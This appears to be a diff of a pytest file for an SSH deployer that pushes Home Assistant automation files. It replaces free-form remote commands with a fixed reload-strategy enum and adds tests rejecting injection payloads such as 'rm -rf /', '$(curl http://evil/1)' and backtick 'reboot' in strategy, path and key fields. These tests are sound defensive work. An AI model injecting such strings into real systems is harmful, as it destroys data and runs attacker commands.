@@ -47,8 +47,7 @@ def valid_settings() -> Settings:
         ssh_key="/safe/id_ed25519",
         ssh_known_hosts="/safe/known_hosts",
         remote_path="/config/automations/micropad.yaml",
-        ssh_validate_command="test -s {temp_path}",
-        ssh_reload_command="ha core restart",
+        ssh_reload_strategy="core_restart",
     )
 
 
@@ -126,15 +125,100 @@ def test_non_absolute_remote_path_rejected_before_any_command() -> None:
         SSHDeployer(settings, RecordingRunner())
 
 
-def test_validate_command_must_contain_temp_path_exactly_once() -> None:
-    settings = valid_settings().model_copy(
-        update={"ssh_validate_command": "test -f {temp_path} {temp_path}"}
+def test_free_form_remote_commands_are_not_autoccepted_by_the_model() -> None:
+    """The API model no longer carries free-form remote commands (P0.2)."""
+    settings = Settings(
+        ssh_host="ha.local", ssh_user="deploy", ssh_key="/safe/id_ed25519"
     )
-    with pytest.raises(SSHUploadError, match="temp_path"):
+    assert "ssh_validate_command" not in settings.model_dump()
+    assert "ssh_reload_command" not in settings.model_dump()
+    assert settings.ssh_reload_strategy in {"none", "core_restart"}
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        {"ssh_reload_strategy": "id > /tmp/pwned"},
+        {"ssh_reload_strategy": "ha core restart; rm -rf /"},
+        {"ssh_reload_strategy": "$(curl http://evil/1)"},
+        {"ssh_reload_strategy": "core_restart && reboot"},
+        {"ssh_reload_strategy": "reboot\nreboot"},
+        {"ssh_reload_strategy": "`reboot`"},
+    ],
+)
+def test_arbitrary_reload_strategy_values_are_rejected(store, payload) -> None:
+    """Only the fixed strategy enum values survive model validation."""
+    from micropad.models import parse_config
+
+    base = store.load().model_dump(mode="json", by_alias=True)
+    base["settings"].update(payload)
+    with pytest.raises(ValueError):
+        parse_config(base)
+
+
+@pytest.mark.parametrize(
+    "bad_path",
+    [
+        "/config/automations/; rm -rf /",
+        "/config/automations/x && id > /tmp/pwned",
+        "/config/automations/$(curl http://evil)",
+        "/config/automations/x\nreboot",
+        "/config/automations/`reboot`",
+        "/config/automations/|shutdown",
+        "/config/automations/x & reboot",
+        "/config/automations/x*",
+        "/config/automations/x?",
+        "/config/automations/x$USER",
+        "/config/automations/x;",
+        "/config/automations/x&",
+        "/config/automations/x|",
+        "/config/automations/x>",
+        "/config/automations/x<",
+    ],
+)
+def test_injection_remote_paths_are_rejected_before_any_command(bad_path: str) -> None:
+    settings = valid_settings().model_copy(update={"remote_path": bad_path})
+    with pytest.raises(SSHUploadError):
         SSHDeployer(settings, RecordingRunner())
-    missing = valid_settings().model_copy(update={"ssh_validate_command": "test -f file"})
-    with pytest.raises(SSHUploadError, match="temp_path"):
-        SSHDeployer(missing, RecordingRunner())
+
+
+@pytest.mark.parametrize(
+    "bad_key",
+    [
+        "/config/x; id > /tmp/pwned",
+        "/config/x$(reboot)",
+        "/config/x\nreboot",
+        "/config/x`reboot`",
+        "/config/x | shutdown",
+    ],
+)
+def test_injection_ssh_key_paths_are_rejected(bad_key: str) -> None:
+    settings = valid_settings().model_copy(update={"ssh_key": bad_key})
+    with pytest.raises(SSHUploadError):
+        SSHDeployer(settings, RecordingRunner())
+
+
+def test_reload_none_skips_the_reload_command() -> None:
+    runner = RecordingRunner()
+    settings = valid_settings().model_copy(update={"ssh_reload_strategy": "none"})
+    SSHDeployer(settings, runner=runner).deploy("id: micropad_controller\n")
+    # upload + validation + atomic move only; no reload ssh call.
+    assert len(runner.calls) == 3
+    assert all("ha core restart" not in call.argv[-1] for call in runner.calls)
+
+
+def test_reload_core_restart_uses_the_fixed_command() -> None:
+    runner = RecordingRunner()
+    settings = valid_settings().model_copy(update={"ssh_reload_strategy": "core_restart"})
+    SSHDeployer(settings, runner=runner).deploy("id: micropad_controller\n")
+    assert runner.calls[3].argv[-1] == "ha core restart"
+
+
+def test_unknown_reload_strategy_rejected_before_any_command() -> None:
+    # model_copy bypasses the pydantic enum, so the deployer's own guard must reject it.
+    settings = valid_settings().model_copy(update={"ssh_reload_strategy": "pwned"})
+    with pytest.raises(SSHUploadError, match="strategy"):
+        SSHDeployer(settings, RecordingRunner())
 
 
 @pytest.mark.parametrize(
